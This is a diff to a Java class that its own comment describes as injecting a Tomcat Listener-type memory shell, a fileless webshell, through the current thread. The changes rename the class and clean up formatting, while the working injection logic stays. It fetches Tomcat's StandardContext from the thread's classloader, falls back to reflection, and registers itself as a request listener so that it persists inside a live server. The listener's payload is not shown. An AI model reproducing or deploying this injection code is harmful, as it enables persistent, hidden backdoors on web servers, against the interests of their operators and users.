@@ -13,17 +13,15 @@ import javax.servlet.http.HttpServletResponse;
 import java.lang.reflect.Field;
 
 /**
- * 使用 线程类 注入 Tomcat Listener 型内存马
- * @author nu1r
+ * 使用线程注入 Tomcat Listener 型内存马
  */
-public class TLMSFromThreadLi implements ServletRequestListener {
-
+public class TFMSFromThreadLi implements ServletRequestListener {
     static {
         try {
             // 获取 standardContext
             WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
 
-            StandardContext       standardContext;
+            StandardContext standardContext;
 
             try {
                 standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
@@ -37,7 +35,7 @@ public class TLMSFromThreadLi implements ServletRequestListener {
                 standardContext = (StandardContext) field2.get(root);
             }
 
-            TLMSFromThreadLi listener = new TLMSFromThreadLi();
+            TFMSFromThreadLi listener = new TFMSFromThreadLi();
             standardContext.addApplicationEventListener(listener);
         } catch (Exception ignored) {
         }
